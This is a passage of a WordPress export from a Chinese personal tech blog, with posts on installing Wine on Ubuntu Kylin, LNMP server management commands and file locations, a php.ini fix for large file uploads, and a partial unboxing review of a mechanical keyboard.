		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="post_tag" nicename="wampserver"><![CDATA[WampServer]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a9%ba%e5%af%86%e7%a0%81"><![CDATA[空密码]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[330]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Ubuntu Kylin 15.10 上安装 wine</title>
		<link>https://www.nervgeek.com/2016/03/16/ubuntu-kylin-15-10-%e4%b8%8a%e5%ae%89%e8%a3%85-wine/</link>
		<pubDate>Wed, 16 Mar 2016 15:04:31 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1110</guid>
		<description></description>
		<content:encoded><![CDATA[笔记本是一台配置很差的电脑，跑Windows已觉卡顿，所以打算安装Ubuntu来延续这台电脑的服役时间。
本来打算安装国产的Linux系统——deepin，但性能要求也不算低，而且也出现大大小小的问题，例如开机无法进入图形化界面等，所以改用另一个比较成熟的Linux系统——Ubuntu Kylin。
但还是无法完全抛弃Windows软件，所以我们使用了Linux上的一个神器——Wine。
目前Wine稳定版为1.8.1，开发版为1.9.5
打开终端，输入 <code>apt-get install -y wine 1.8.1</code>
稍作等待，后面会提示输入号码等操作，直接回车即可。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1110</wp:post_id>
		<wp:post_date><![CDATA[2016-03-16 23:04:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-16 15:04:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[ubuntu-kylin-15-10-%e4%b8%8a%e5%ae%89%e8%a3%85-wine]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="kylin"><![CDATA[kylin]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="ubuntu"><![CDATA[Ubuntu]]></category>
		<category domain="post_tag" nicename="windows"><![CDATA[windows]]></category>
		<category domain="post_tag" nicename="wine"><![CDATA[wine]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e8%a3%85"><![CDATA[安装]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[348]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>一键LNMP的命令以及配置文件的存放地址</title>
		<link>https://www.nervgeek.com/2016/03/17/%e4%b8%80%e9%94%aelnmp%e7%9a%84%e5%91%bd%e4%bb%a4%e4%bb%a5%e5%8f%8a%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e7%9a%84%e5%ad%98%e6%94%be%e5%9c%b0%e5%9d%80/</link>
		<pubDate>Thu, 17 Mar 2016 07:32:19 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1113</guid>
		<description></description>
		<content:encoded><![CDATA[一般人快速搭建网站都会选择一键LNMP来快速搭建环境，本博客就是基于那个一键LNMP搭建起来的，日常维护使用非常方便。
<strong>管理命令：</strong>

<ul>
    <li><strong>LNMP状态管理：</strong> <code>lnmp {start|stop|reload|restart|kill|status}</code></li>
    <li><strong>LNMP各个程序的状态管理：</strong><code>lnmp {nginx|mysql|mariadb|php-fpm|pureftpd} {start|stop|reload|restart|kill|status}</code></li>
    <li><strong>虚拟主机管理：</strong> <code>lnmp vhost {add|list|del}</code></li>
    <li><strong>数据库管理：</strong> <code>lnmp database {add|list|del}</code></li>
    <li><strong>FTP用户管理：</strong> <code>lnmp ftp {add|list|del}</code></li>
</ul>

<!--more-->
<strong>LNMP状态管理命令：</strong>

<ul>
    <li>LNMP 1.2状态管理: lnmp {start|stop|reload|restart|kill|status}</li>
    <li>LNMP 1.2各个程序状态管理: lnmp {nginx|mysql|mariadb|php-fpm|pureftpd} {start|stop|reload|restart|kill|status}</li>
    <li>LNMP 1.1状态管理： /root/lnmp {start|stop|reload|restart|kill|status}</li>
    <li>Nginx状态管理：/etc/init.d/nginx {start|stop|reload|restart}</li>
    <li>MySQL状态管理：/etc/init.d/mysql {start|stop|restart|reload|force-reload|status}</li>
    <li>Memcached状态管理：/etc/init.d/memcached {start|stop|restart}</li>
    <li>PHP-FPM状态管理：/etc/init.d/php-fpm {start|stop|quit|restart|reload|logrotate}</li>
    <li>PureFTPd状态管理： /etc/init.d/pureftpd {start|stop|restart|kill|status}</li>
    <li>ProFTPd状态管理： /etc/init.d/proftpd {start|stop|restart|reload}</li>
    <li>如重启LNMP，输入命令：/root/lnmp restart 即可，单独重启mysql：/etc/init.d/mysql restart</li>
</ul>

&nbsp;
<strong>LNMPA状态管理命令：</strong>

<ul>
    <li>LNMPA 1.2状态管理: lnmp {start|stop|reload|restart|kill|status}</li>
    <li>LNMPA 1.2各个程序状态管理: lnmp {httpd|mysql|mariadb|pureftpd} {start|stop|reload|restart|kill|status}</li>
    <li>LNMPA1.1状态管理： /root/lnmpa {start|stop|reload|restart|kill|status}</li>
    <li>Nginx状态管理：/etc/init.d/nginx {start|stop|reload|restart}</li>
    <li>MySQL状态管理：/etc/init.d/mysql {start|stop|restart|reload|force-reload|status}</li>
    <li>Memcached状态管理：/etc/init.d/memcached {start|stop|restart}</li>
    <li>PureFTPd状态管理： /etc/init.d/pureftpd {start|stop|restart|kill|status}</li>
    <li>ProFTPd状态管理： /etc/init.d/proftpd {start|stop|restart|reload}</li>
    <li>Apache状态管理：/etc/init.d/httpd {start|stop|restart|graceful|graceful-stop|configtest|status}</li>
</ul>

&nbsp;
<strong>LAMP状态管理命令：</strong>

<ul>
    <li>LAMP 1.2状态管理: lnmp {start|stop|reload|restart|kill|status}</li>
    <li>LAMP 1.2各个程序状态管理: lnmp {httpd|mysql|mariadb|pureftpd} {start|stop|reload|restart|kill|status}</li>
</ul>

&nbsp;
<strong>LNMP相关软件安装目录：</strong>

<ul>
    <li>Nginx 目录: /usr/local/nginx/</li>
    <li>MySQL 目录 : /usr/local/mysql/</li>
    <li>MySQL数据库所在目录：/usr/local/mysql/var/</li>
    <li>MariaDB 目录 : /usr/local/mariadb/</li>
    <li>MariaDB数据库所在目录：/usr/local/mariadb/var/</li>
    <li>PHP目录 : /usr/local/php/</li>
    <li>PHPMyAdmin目录 : 0.9版本为/home/wwwroot/phpmyadmin/ 1.0及以后版本为 /home/wwwroot/default/phpmyadmin/ 强烈建议将此目录重命名为其不容易猜到的名字。phpmyadmin可自己从官网下载新版替换。</li>
    <li>默认网站目录 : 0.9版本为 /home/wwwroot/ 1.0及以后版本为 /home/wwwroot/default/</li>
    <li>Nginx日志目录：/home/wwwlogs/</li>
    <li>/root/vhost.sh添加的虚拟主机配置文件所在目录：/usr/local/nginx/conf/vhost/</li>
    <li>PureFtpd 目录：/usr/local/pureftpd/</li>
    <li>PureFtpd web管理目录： 0.9版为/home/wwwroot/default/ftp/ 1.0版为 /home/wwwroot/default/ftp/</li>
    <li>Proftpd 目录：/usr/local/proftpd/</li>
    <li>Redis 目录：/usr/local/redis/</li>
</ul>

&nbsp;
<strong>LNMP相关配置文件位置：</strong>

<ul>
    <li>Nginx主配置文件：/usr/local/nginx/conf/nginx.conf</li>
    <li>/root/vhost.sh添加的虚拟主机配置文件：/usr/local/nginx/conf/vhost/域名.conf</li>
    <li>MySQL配置文件：/etc/my.cnf</li>
    <li>PHP配置文件：/usr/local/php/etc/php.ini</li>
    <li>php-fpm配置文件：/usr/local/php/etc/php-fpm.conf</li>
    <li>PureFtpd配置文件：/usr/local/pureftpd/pure-ftpd.conf</li>
    <li>PureFtpd MySQL配置文件：/usr/local/pureftpd/pureftpd-mysql.conf</li>
    <li>Proftpd配置文件：/usr/local/proftpd/etc/proftpd.conf 1.2及之前版本为/usr/local/proftpd/proftpd.conf</li>
    <li>Proftpd 用户配置文件：/usr/local/proftpd/etc/vhost/用户名.conf</li>
    <li>Redis 配置文件：/usr/local/redis/etc/redis.conf</li>
</ul>

&nbsp;
<strong>LNMPA相关目录文件位置：</strong>

<ul>
    <li>Apache目录：/usr/local/apache/</li>
    <li>Apache配置文件：/usr/local/apache/conf/httpd.conf</li>
    <li>Apache虚拟主机配置文件目录：/usr/local/apache/conf/vhost/</li>
    <li>虚拟主机配置文件名称：/usr/local/apache/conf/vhost/域名.conf</li>
</ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1113</wp:post_id>
		<wp:post_date><![CDATA[2016-03-17 15:32:19]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-17 07:32:19]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%b8%80%e9%94%aelnmp%e7%9a%84%e5%91%bd%e4%bb%a4%e4%bb%a5%e5%8f%8a%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e7%9a%84%e5%ad%98%e6%94%be%e5%9c%b0%e5%9d%80]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="lnmp"><![CDATA[lnmp]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="nginx"><![CDATA[nginx]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="post_tag" nicename="%e4%b8%80%e9%94%ae"><![CDATA[一键]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[339]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>php上传文件过大导致POST空值</title>
		<link>https://www.nervgeek.com/2016/03/22/php%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e8%bf%87%e5%a4%a7%e5%af%bc%e8%87%b4post%e7%a9%ba%e5%80%bc/</link>
		<pubDate>Tue, 22 Mar 2016 06:12:37 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1119</guid>
		<description></description>
		<content:encoded><![CDATA[最近在写一个匿名版程序，有一个图片上传功能，程序规定了图片大小不允许超过3M，可是在发1M~2M的图片时，也会上传失败，导致程序报错。
<code>Notice: Undefined index: send in D:\wamp\www\reNMB\Module\post.php on line <i>42</i></code>
检查了无数遍，我确实有把title的值POST过去，为什么会说无定义呢？在百度的过程中，找到有人问：
<code>php文件上传在php.ini中都设置了 post为150M 上传100M 时间设置0，为什么我上传5M文件还是显示错误1？</code>
我才意识到，很可能是因为自己的php配置文件有问题。
解决方法如下：

<pre>关于大文件的上传，需要做如下修改：
打开php.ini，首先找到
file_uploads = on ;是否允许通过HTTP上传文件的开关。默认为ON即是开
upload_tmp_dir ;文件上传至服务器上存储临时文件的地方，如果没指定就会用系统默认的临时文件夹
upload_max_filesize = 8m ;望文生意，即允许上传文件大小的最大值。默认为2M
post_max_size = 8m ;指通过表单POST给PHP的所能接收的最大值，包括表单里的所有值。默认为8M
一般地，设置好上述四个参数后，上传&lt;=8M的文件是不成问题，在网络正常的情况下。
但如果要上传&gt;8M的大体积文件，只设置上述四项还一定能行的通。
进一步配置以下的参数
max_execution_time = 600 ;每个PHP页面运行的最大时间值(秒)，默认30秒
max_input_time = 600 ;每个PHP页面接收数据所需的最大时间，默认60秒
memory_limit = 8m ;每个PHP页面所吃掉的最大内存，默认8M
把上述参数修改后，在网络所允许的正常情况下，就可以上传大体积文件了
max_execution_time = 600
max_input_time = 600
memory_limit = 32m
file_uploads = on
upload_tmp_dir = /tmp
upload_max_filesize = 32m
post_max_size = 32m</pre>

最终修复了文件上传Bug。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1119</wp:post_id>
		<wp:post_date><![CDATA[2016-03-22 14:12:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-22 06:12:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e8%bf%87%e5%a4%a7%e5%af%bc%e8%87%b4post%e7%a9%ba%e5%80%bc]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="post_tag" nicename="php-ini"><![CDATA[php.ini]]></category>
		<category domain="post_tag" nicename="post"><![CDATA[POST]]></category>
		<category domain="post_tag" nicename="%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0"><![CDATA[文件上传]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a9%ba%e5%80%bc"><![CDATA[空值]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[407]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>酷冷至尊 MasterKeys PRO L 茶轴</title>
		<link>https://www.nervgeek.com/2016/03/26/%e9%85%b7%e5%86%b7%e8%87%b3%e5%b0%8a-masterkeys-pro-l-%e8%8c%b6%e8%bd%b4/</link>
		<pubDate>Sat, 26 Mar 2016 13:21:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1122</guid>
		<description></description>
		<content:encoded><![CDATA[本来在张大妈发布的，想了下在博客也发一遍算了..图没全替换掉(懒)。
第一把机械键盘是五年前买的魔力鸭DK2108，这五年来也时不时地留意一下机械键盘的发展，从当年机械作为卖点，到现在以RGB作为卖点。机械键盘在快速更新迭代，我看了下手中的魔力鸭2108，总感觉有些落伍了，但键盘本身还是非常不错的，多年来没有出过一点问题<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/a5771bce93e200c36f7cd9dfd0e5deaa.png" alt="" />。
新年在手术中度过，所以新年压岁钱囤到现在一分钱没花。手里握着一小笔钱，终于可以盼望一下新的机械键盘，不少朋友买了K70，但RGB版的比较贵，舍不得花这钱。在兜兜转转的过程中，看到了一篇关于酷冷至尊 MasterKeys PRO L的新闻：<strong>110美元的定价、樱桃RGB轴、键线分离、多种灯光玩法</strong>，这几个卖点都抓住了我的眼球。目前只发售了红和茶轴，青、黑轴需要等到四月份才能发售。这倒不影响什么，我也用了很多年茶轴了，所以新键盘我还是继续使用茶轴。
<strong>淘宝搜索连接：<a href="http://s.taobao.com/search?initiative_id=tbindexz_20160326&amp;ie=utf8&amp;spm=a21bo.7724922.8452-taobao-item.2&amp;sourceId=tb.index&amp;search_type=item&amp;ssid=s5-e&amp;commend=all&amp;imgfile=&amp;q=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A+pro+l&amp;suggest=history_1&amp;_input_charset=utf-8&amp;wq=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A&amp;suggest_query=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A&amp;source=suggest" target="_blank" rel="nofollow"><span class="res_smzdm title">酷冷至尊 PRO L</span></a><span class="res_smzdm oth"><a href="http://s.taobao.com/search?initiative_id=tbindexz_20160326&amp;ie=utf8&amp;spm=a21bo.7724922.8452-taobao-item.2&amp;sourceId=tb.index&amp;search_type=item&amp;ssid=s5-e&amp;commend=all&amp;imgfile=&amp;q=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A+pro+l&amp;suggest=history_1&amp;_input_charset=utf-8&amp;wq=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A&amp;suggest_query=%E9%85%B7%E5%86%B7%E8%87%B3%E5%B0%8A&amp;source=suggest" target="_blank" rel="nofollow">s.taobao.com</a></span></strong>
<strong>官网商品介绍(附有驱动软件下载)：</strong><strong><a href="http://www.coolermaster.com.cn/storm/gaming-keyboard/SGK-6020-KKCR1-US/" target="_blank">MasterKeys Pro L</a></strong>
<!--more-->

<h4>一、键盘本体</h4>

<span class="img_desc"> <a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0091.jpg" rel="attachment wp-att-1123"><img class="aligncenter wp-image-1123" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0091.jpg" alt="DSC_0091" width="1280" height="720" /></a></span>
一大早就收到顺丰快递的短信通知，上海到河源隔天就到了，这速度没得说<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/ea5d2f1c4608232e07d3aa3d998e5135.png" alt="" />。穿好衣服冲出宿舍直奔顺丰。抱回来就是上面那张图的样子了。
和键盘一起购买的还有G502S，但张大妈上关于G502S的文章也不少了，这里不开箱了。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0093.jpg" rel="attachment wp-att-1125"><img class="alignnone wp-image-1125" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0093.jpg" alt="DSC_0093" width="1280" height="720" /></a>
酷冷至尊 MasterKeys PRO L本体！盒子手感不错，也非常牢固。也可能是因为顺丰对待快递相对温柔一点吧。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0094.jpg" rel="attachment wp-att-1126"><img class="alignnone wp-image-1126" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0094.jpg" alt="DSC_0094" width="1280" height="720" /></a>
打开箱子，键盘被一块黑色的布包围着，这张布很薄，我也想不出有什么作用<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/d645920e395fedad7bbbed0eca3fe2e0.png" alt="" />，布料就是平时摄影棚的背景布。而且也没送防尘罩，当年魔力鸭的键盘还送了防尘罩呢。不过看样子魔力鸭的防尘罩可以直接用在酷冷至尊上。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0150.jpg" rel="attachment wp-att-1127"><img class="alignnone wp-image-1127" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0150.jpg" alt="DSC_0150" width="1200" height="675" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0151.jpg" rel="attachment wp-att-1128"><img class="alignnone wp-image-1128" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0151.jpg" alt="DSC_0151" width="1200" height="675" /></a>
开箱的时候忘了拍几张键盘的“素颜”图，补拍几张。可以清晰见到酷冷至尊这款机械键盘使用白色的钢板，光线的反射使RGB亮度更高，色彩更加鲜艳<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/182be0c5cdcd5072bb1864cdee4d3d6e.png" alt="" />。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0115.jpg" rel="attachment wp-att-1129"><img class="alignnone wp-image-1129" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0115.jpg" alt="DSC_0115" width="1280" height="720" /></a>
键盘侧面照，不开支撑架最高高度约为3cm，最低高度约为2.1cm。(尺子粗量，不算键帽)。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0135.jpg" rel="attachment wp-att-1130"><img class="alignnone wp-image-1130" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0135.jpg" alt="DSC_0135" width="1280" height="720" /></a>
酷冷至尊采用的是键线分离的设计，两边的插头都有镀金。由于没有带单反回学校，只能用手机拍摄了，镀金的插头怎么拍都像白色，但和白色的背景一对比，还是闪着土豪金的颜色的。
三向分线槽设计，我要吐槽一下，左右九十度分线的时候，总有点怕折断USB...<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/e2ef524fbf3d9fe611d5a8e90fefdc9c.png" alt="" />
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0106.jpg" rel="attachment wp-att-1131"><img class="alignnone wp-image-1131" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0106.jpg" alt="DSC_0106" width="1280" height="720" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0105.jpg" rel="attachment wp-att-1132"><img class="alignnone wp-image-1132" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0105.jpg" alt="DSC_0105" width="1280" height="720" /></a>
键盘支撑架为一段式，打开后使键盘高大概提高了1.3cm左右，支撑架硬度，稍加力度下压也没有明显形变。支撑架的脚垫还具有防滑的功能，不会导致打开支撑架之后一边打字一边漂移。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0109.jpg" rel="attachment wp-att-1133"><img class="alignnone wp-image-1133" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0109.jpg" alt="DSC_0109" width="1280" height="720" /></a>
是时候要验明正身了——樱桃RGB茶轴。我自己也没摸过多少把键盘，但不知道是新键盘的问题还是轴的问题，和我魔力鸭的茶轴相比，感觉酷冷至尊的茶轴比几年前的茶轴下压力度要大一些。不过个人感觉还是因为以前的键盘用久了而已吧。
键帽表面使用类肤材质，摸起来就像少女的皮肤般光滑<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/d67d8ab4f4c10bf22aa353e27879133c.png" alt="" />，触感非常舒服，手有水时会留下水印，干后即消。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0121.jpg" rel="attachment wp-att-1134"><img class="alignnone wp-image-1134" src="https://www.nervgeek.com/wp-content/uploads/2016/03/DSC_0121.jpg" alt="DSC_0121" width="1280" height="720" /></a>
大键采用卫星轴，左右两边和中间手感差别不大，整体手感较肉，空格键较点松动，个人可以接受<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/fbd7939d674997cdb4692d34de8633c4.png" alt="" />。
但是有个问题来了！
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/2138b77bc5189ef0c3eb43608f896428.jpg" alt="" />
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/27b64d4e7eff4660c339aa421f4d38f9.jpg" alt="" />
键帽非常脏！空格全是黑斑！键帽也有黑色粉末，这分明逼我刚买来就要先下水一遍！而且不是个别键帽的问题，全部键帽我都拆开来看过一遍，多多少少都有黑色的粉末。出厂的时候没有事先清洗一遍的吗？
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/4bf8c9d3537a6cadd20401369302d65f.jpg" alt="" />
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/f24e6f2647ba9fcb83b0cbc1d5aeb4e8.jpg" alt="" />
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/43e7d6de904d784ac6f2e93c596e2400.jpg" alt="" />
好了，现在来看看这款键盘的最大卖点了——RGB。手机曝光问题，第一张的亮度和实际较为相近，第二太亮，第三张太暗。灯还是非常不错的！可惜是拍照的时候是白天，不知道晚上如何。
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/61a608cffbc12a26c97ef2ec65c9eceb.jpg" alt="" />
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/3acb7bd76dffad92cc0f2ef736fbd040.jpg" alt="" />
再上几张灯照。手有点抖，有点模糊对不起了<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/35f4a8d465e6e1edc05f3d8ab658c551.png" alt="" />。
对于键盘本体的个人看法就这么多了，贴吧上有些人吐槽键帽是ABS、按键肉、松等小问题，我个人是还能接受的，如对这键盘抱有质疑的话，您可以私信问一下我。

<h2>二、驱动软件</h2>

截至到我写稿的时候(3-26)，驱动最新版本为1.1.4。
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/608f81713daa4136437194ab611617b4.jpg" alt="" />
启动界面：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/a6ea17f8112f9b4c34114cf277c6ab28.jpg" alt="" />
管理界面：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/8baebe0187967af6e077bd0054e92773.jpg" alt="" />
一共可以自定义四种配置方案，按键盘右上角的P1、P2、P3、P4进行切换。
